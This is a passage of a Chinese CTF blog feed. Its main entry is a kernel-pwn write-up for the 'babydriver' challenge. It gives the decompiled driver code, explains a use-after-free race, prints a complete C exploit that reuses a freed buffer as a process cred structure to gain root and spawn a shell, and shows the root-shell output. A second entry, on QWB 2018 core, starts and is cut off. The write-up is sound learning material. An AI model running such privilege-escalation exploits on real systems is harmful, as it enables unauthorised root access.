class=\"line\">  &#123;</span><br><span class=\"line\">    v6 = v4;</span><br><span class=\"line\">    copy_from_user();</span><br><span class=\"line\">    result = v6;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"babyioctl\"><a class=\"markdownIt-Anchor\" href=\"#babyioctl\">#</a> babyioctl</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">babyioctl</span><span class=\"params\">(file *filp, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> command, <span class=\"type\">unsigned</span> __int64 arg)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> v3; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> v4; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  __int64 v5; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class=\"line\">  v4 = v3;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( command == <span class=\"number\">65537</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    kfree(babydev_struct.device_buf);</span><br><span class=\"line\">    babydev_struct.device_buf = (<span class=\"type\">char</span> *)_kmalloc(v4, <span class=\"number\">37748928LL</span>);</span><br><span class=\"line\">    babydev_struct.device_buf_len = v4;</span><br><span class=\"line\">    printk(<span class=\"string\">&quot;alloc done\\n&quot;</span>, <span class=\"number\">37748928LL</span>, v5);</span><br><span class=\"line\">    result = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    printk(&amp;unk_2EB, v3, v3);</span><br><span class=\"line\">    result = <span class=\"number\">-22LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>babyioct，会释放原本的 buf，然后重新申请一个，但是不会对空间的数据进行初始化，导致数据的泄露。v4 是一个固定的大下，在 init 中初始化为我蛮传入的第三个参数。</p>\n<h2 id=\"漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h2>\n<p>ioctl 存在一个条件竞争，使用同一个全局变量 buf，类似用户态下的 uaf。新的进程会覆盖这个变量，那么我们可以将它释放，然后重新申请出来作为新的东西，但是我们仍旧可对其进行编辑。新的进程会创建 cred, 所以就可以让他将这个空间申请出来，然后我们对其进行编辑。</p>\n<h2 id=\"完整的exp\"><a class=\"markdownIt-Anchor\" href=\"#完整的exp\">#</a> 完整的 exp</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;pthread.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;signal.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;poll.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/syscall.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/ioctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/sem.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;semaphore.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;poll.h&gt;</span></span></span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> <span class=\"type\">const</span> **argv)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"type\">int</span> fd1 = open(<span class=\"string\">&quot;dev/babydev&quot;</span>,O_RDWR);</span><br><span class=\"line\">\t<span class=\"type\">int</span> fd2 = open(<span class=\"string\">&quot;dev/babydev&quot;</span>,O_RDWR);</span><br><span class=\"line\">\t<span class=\"type\">char</span> buf[<span class=\"number\">28</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t<span class=\"comment\">//alloc a 0xa8 space to create a fake cred</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;ppid %d, pid %d\\n&quot;</span>,getppid(),getpid());</span><br><span class=\"line\">\tioctl(fd1,<span class=\"number\">65537</span>,<span class=\"number\">0xa8</span>);</span><br><span class=\"line\">\tclose(fd1);</span><br><span class=\"line\">\t<span class=\"type\">int</span> fpid = fork();      \t\t<span class=\"comment\">//create a new proc as the same as now</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;fpid is %d\\n&quot;</span>,fpid);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;ppid %d, pid %d\\n&quot;</span>,getppid(),getpid());</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!fpid)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;ppid %d, pid %d\\n&quot;</span>,getppid(),getpid());</span><br><span class=\"line\">\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;right&quot;</span>);</span><br><span class=\"line\">\t\twrite(fd2,buf,<span class=\"number\">28</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(getuid()==<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;welcome!\\n&quot;</span>);</span><br><span class=\"line\">\t\t\tsystem(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (fpid&lt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;error&quot;</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;hello&quot;</span>);</span><br><span class=\"line\">\twait(<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tclose(fd2);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>fork 会返回两个 id, 这也是 fork 的一个有意的东西，这里其实是一个类似递归的调用，当我们 fork 一个新的进程后，其申请出来的资源与我们的原本进程是几乎一样的，只有部分数据不一样。有一些师傅说，父进程与子进程的实行顺序是不一样的。但是我们预测大部分情况下使直接进入子进程，进入子进程后还会调用 fork，但是此时 fork 返回的是 0，也就是说不会再嵌套下去。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./exp</span><br><span class=\"line\">[    3.998984] device open</span><br><span class=\"line\">[    3.999759] device open</span><br><span class=\"line\">ppid 88, pid 90</span><br><span class=\"line\">[    4.000779] alloc <span class=\"keyword\">done</span></span><br><span class=\"line\">[    4.001334] device release</span><br><span class=\"line\">fpid is 91</span><br><span class=\"line\">ppid 88, pid 90</span><br><span class=\"line\">hello</span><br><span class=\"line\">fpid is 0</span><br><span class=\"line\">ppid 90, pid 91</span><br><span class=\"line\">ppid 90, pid 91</span><br><span class=\"line\">right</span><br><span class=\"line\">welcome!</span><br><span class=\"line\"></span><br><span class=\"line\">/ <span class=\"comment\"># id</span></span><br><span class=\"line\">uid=0(root) gid=0(root) <span class=\"built_in\">groups</span>=1000(ctf)</span><br><span class=\"line\">/ <span class=\"comment\"># [  101.861273] device release</span></span><br><span class=\"line\">/ $ [  104.213209] ACPI: Preparing to enter system <span class=\"built_in\">sleep</span> state S5</span><br></pre></td></tr></table></figure>\n<p>一些师傅说，父进程与子进程的执行顺序会受到不同系统决策的影响。</p>\n<p>以我的设备为例。我们启动 exp 的进程，pid 为 90，他的父进程的 id 为 88，fork 出来的进程，返回的 id 为 91. 下面进入 fork 了吗？我们看到 pid，和 ppid 没有变，说明我们并没有进入到子进程，当我们的这部分结束后，有直接进入了 fork 里，子进程里又会调用 fork, 但是此时返回的是 0。</p>\n<h2 id=\"打包\"><a class=\"markdownIt-Anchor\" href=\"#打包\">#</a> 打包</h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> File_system</span><br><span class=\"line\"><span class=\"built_in\">cp</span> rootfs.cpio ./File_system/rootfs.cpio.gz</span><br><span class=\"line\"><span class=\"built_in\">cd</span> File_system</span><br><span class=\"line\">gunzip rootfs.cpio.gz</span><br><span class=\"line\">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure>\n<p>上面是对文件系统的解包处理，下面的 pack.sh 会将我们写好的 exp 写入，后面启动的时候，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1wYWNrLTk1NWZtYnkzMGU2bzNhaDVhLnhuLS1zaGJvb3QtNGwyam1uLnNo\">我们可以把 pack.sh 写入 boot.sh</span></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pack.sh</span><br><span class=\"line\"><span class=\"built_in\">cd</span> File_system</span><br><span class=\"line\">gcc exploit.c -static -o exp</span><br><span class=\"line\">find . | cpio -o --format=newc &gt; ../rootfs.cpio</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ../</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"调试\"><a class=\"markdownIt-Anchor\" href=\"#调试\">#</a> 调试</h2>\n<p>我们再启动的脚本里面，对 quem_system_x86_64 启用了人 - s，也就是说我们打开了一个默认的端口。我们也可以指定端口。</p>\n<p>提取 vmlinux，需要使用 extract-vmlinux 脚本提取出带符号的源码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>\n<p>启动 gdb</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb ./vmlinux -q</span><br><span class=\"line\">导入符号表,这里需要查看模块加载在内存中的真实地址，用boot.sh脚本运行之后输入命令lsmod即可</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/ $ lsmod</span><br><span class=\"line\">babydriver 16384 0 - Live 0xffffffffc0000000 (OE)</span><br></pre></td></tr></table></figure>\n<p>然后在 gdb 中输入</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add-symbol-file **/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000</span><br></pre></td></tr></table></figure>\n<p>​\t两个参数分别为 babydriver.ko 在解包后的文件系统中的路径以及.text 段的地址。地址可以直接在 qemu 中查看：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/20190909200711518.png\" alt=\"在这里插入图片描述\"></p>\n<p>添加远程执行参数，在 boot.sh 的 qemu 参数中添加</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-gdb tcp::7777</span><br></pre></td></tr></table></figure>\n<p>gdb 连接程序，在 gdb 中执行命令</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">target remote <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span>:<span class=\"number\">7777</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"相关的结构体\"><a class=\"markdownIt-Anchor\" href=\"#相关的结构体\">#</a> 相关的结构体</h2>\n<h3 id=\"cred\"><a class=\"markdownIt-Anchor\" href=\"#cred\">#</a> cred</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cred</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"type\">atomic_t</span>\tusage;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class=\"line\">\t<span class=\"type\">atomic_t</span>\tsubscribers;\t<span class=\"comment\">/* number of processes subscribed */</span></span><br><span class=\"line\">\t<span class=\"type\">void</span>\t\t*put_addr;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span>\tmagic;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CRED_MAGIC\t0x43736564</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CRED_MAGIC_DEAD\t0x44656144</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">\t<span class=\"type\">kuid_t</span>\t\tuid;\t\t<span class=\"comment\">/* real UID of the task */</span></span><br><span class=\"line\">\t<span class=\"type\">kgid_t</span>\t\tgid;\t\t<span class=\"comment\">/* real GID of the task */</span></span><br><span class=\"line\">\t<span class=\"type\">kuid_t</span>\t\tsuid;\t\t<span class=\"comment\">/* saved UID of the task */</span></span><br><span class=\"line\">\t<span class=\"type\">kgid_t</span>\t\tsgid;\t\t<span class=\"comment\">/* saved GID of the task */</span></span><br><span class=\"line\">\t<span class=\"type\">kuid_t</span>\t\teuid;\t\t<span class=\"comment\">/* effective UID of the task */</span></span><br><span class=\"line\">\t<span class=\"type\">kgid_t</span>\t\tegid;\t\t<span class=\"comment\">/* effective GID of the task */</span></span><br><span class=\"line\">\t<span class=\"type\">kuid_t</span>\t\tfsuid;\t\t<span class=\"comment\">/* UID for VFS ops */</span></span><br><span class=\"line\">\t<span class=\"type\">kgid_t</span>\t\tfsgid;\t\t<span class=\"comment\">/* GID for VFS ops */</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span>\tsecurebits;\t<span class=\"comment\">/* SUID-less security management */</span></span><br><span class=\"line\">\t<span class=\"type\">kernel_cap_t</span>\tcap_inheritable; <span class=\"comment\">/* caps our children can inherit */</span></span><br><span class=\"line\">\t<span class=\"type\">kernel_cap_t</span>\tcap_permitted;\t<span class=\"comment\">/* caps we&#x27;re permitted */</span></span><br><span class=\"line\">\t<span class=\"type\">kernel_cap_t</span>\tcap_effective;\t<span class=\"comment\">/* caps we can actually use */</span></span><br><span class=\"line\">\t<span class=\"type\">kernel_cap_t</span>\tcap_bset;\t<span class=\"comment\">/* capability bounding set */</span></span><br><span class=\"line\">\t<span class=\"type\">kernel_cap_t</span>\tcap_ambient;\t<span class=\"comment\">/* Ambient capability set */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> CONFIG_KEYS</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">char</span>\tjit_keyring;\t<span class=\"comment\">/* default keyring to attach requested</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t * keys to */</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">key</span> __<span class=\"title\">rcu</span> *<span class=\"title\">session_keyring</span>;</span> <span class=\"comment\">/* keyring inherited over fork */</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">key</span>\t*<span class=\"title\">process_keyring</span>;</span> <span class=\"comment\">/* keyring private to this process */</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">key</span>\t*<span class=\"title\">thread_keyring</span>;</span> <span class=\"comment\">/* keyring private to this thread */</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">key</span>\t*<span class=\"title\">request_key_auth</span>;</span> <span class=\"comment\">/* assumed request_key authority */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> CONFIG_SECURITY</span></span><br><span class=\"line\">\t<span class=\"type\">void</span>\t\t*security;\t<span class=\"comment\">/* subjective LSM security */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">user_struct</span> *<span class=\"title\">user</span>;</span>\t<span class=\"comment\">/* real user ID subscription */</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">user_namespace</span> *<span class=\"title\">user_ns</span>;</span> <span class=\"comment\">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">group_info</span> *<span class=\"title\">group_info</span>;</span>\t<span class=\"comment\">/* supplementary groups for euid/fsgid */</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">rcu_head</span>\t<span class=\"title\">rcu</span>;</span>\t\t<span class=\"comment\">/* RCU deletion hook */</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">//总大小0xa8，一直到gid结束是28个字节</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"参考链接\"><a class=\"markdownIt-Anchor\" href=\"#参考链接\">#</a> 参考链接</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzM4MTAwNTY5L2FydGljbGUvZGV0YWlscy8xMDA2NzMxMDM=\">https://blog.csdn.net/m0_38100569/article/details/100673103</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuejFyMC50b3AvMjAyMS8xMC8yOS9rZXJuZWwtcHduJUVGJUJDJTg4JUU0JUJBJThDJUVGJUJDJTg5JUU1JTlGJUJBJUU3JUExJTgwJUU3JTlGJUE1JUU4JUFGJTg2LyMlRTUlQUUlOUUlRTYlODglOTg=\">https://www.z1r0.top/2021/10/29/kernel-pwn（二）基础知识 /# 实战</span></p>\n<h3 id=\"参考博客\"><a class=\"markdownIt-Anchor\" href=\"#参考博客\">#</a> 参考博客</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuejFyMC50b3Av\">https://www.z1r0.top/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcnR0bmJhMy5jbi8=\">https://arttnba3.cn/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXktY3AuZ2l0aHViLmlvL2NhdGVnb3J5Lw==\">https://ray-cp.github.io/category/</span>\t\t\t//ray 大佬写的很多知识的总结，很详尽</p>\n",
            "tags": [
                "learning"
            ]
        },
        {
            "id": "http://example.com/2022/05/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2018-core/",
            "url": "http://example.com/2022/05/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2018-core/",
            "title": "强网杯2018_core",
            "date_published": "2022-05-01T10:14:39.000Z",
            "content_html": "<h1 id=\"2018强网杯core作为kernel学习开始的记录栈溢出ret2rop\"><a class=\"markdownIt-Anchor\" href=\"#2018强网杯core作为kernel学习开始的记录栈溢出ret2rop\">#</a> 2018 强网杯 core，作为 kernel 学习开始的记录，栈溢出，ret2rop</h1>\n<h2 id=\"前置zhishi\"><a class=\"markdownIt-Anchor\" href=\"#前置zhishi\">#</a> 前置 zhishi</h2>\n<h2 id=\"1题目环境\"><a class=\"markdownIt-Anchor\" href=\"#1题目环境\">#</a> 1. 题目环境</h2>\n<p>题目保护环境有两类，一类可执行文件的保护机制，一类是文件系统驱动内核的保护机制</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/kernel/<span class=\"number\">2018</span>qwb_core/give_to_player$ checksec core.ko</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/dreamcat/Desktop/kernel/2018qwb_core/give_to_player/core.ko&#x27;</span></span><br><span class=\"line\">    Arch:     amd64<span class=\"number\">-64</span>-little</span><br><span class=\"line\">    RELRO:    No RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No <span class=\"title function_\">PIE</span> <span class=\"params\">(<span class=\"number\">0x0</span>)</span></span><br><span class=\"line\">    </span><br><span class=\"line\"> start.sh:       </span><br><span class=\"line\">    qemu-system-x86_64 \\</span><br><span class=\"line\">-m 128M \\</span><br><span class=\"line\">-kernel ./bzImage \\</span><br><span class=\"line\">-initrd  ./rootfs.cpio \\</span><br><span class=\"line\">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=<span class=\"number\">1</span> quiet kaslr<span class=\"string\">&quot; \\</span></span><br><span class=\"line\"><span class=\"string\">-s  \\</span></span><br><span class=\"line\"><span class=\"string\">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\</span></span><br><span class=\"line\"><span class=\"string\">-nographic  \\</span></span><br><span class=\"line\"><span class=\"string\">~                  </span></span><br></pre></td></tr></table></figure>\n<p>可以看到这里开启了 kaslr 保护。</p>\n<h2 id=\"2\"><a class=\"markdownIt-Anchor\" href=\"#2\">#</a> 2.</h2>\n<h3 id=\"canary\"><a class=\"markdownIt-Anchor\" href=\"#canary\">#</a> canary</h3>\n<p>core.ko 开启了 canary，我们需要泄露他，进而构造 rop</p>\n<h3 id=\"kaslr\"><a class=\"markdownIt-Anchor\" href=\"#kaslr\">#</a> kaslr</h3>\n<p>kaslr 类似与用户 pwn 的 aslr 或者 pie，一种地址偏移技术。如果我们可以获取 vmlinux_base 就可以绕过这个，执行其他函数。</p>\n<p>获取方式:head /proc/kallsyms 1,startup 对应的地址就是基址</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/img_convert/8fbf9fb6608de56c46b546cc63017967.png\" alt=\"img\"></p>\n<h3 id=\"core_base\"><a class=\"markdownIt-Anchor\" href=\"#core_base\">#</a> core_base</h3>\n<p>驱动加载地址，查看方式</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span 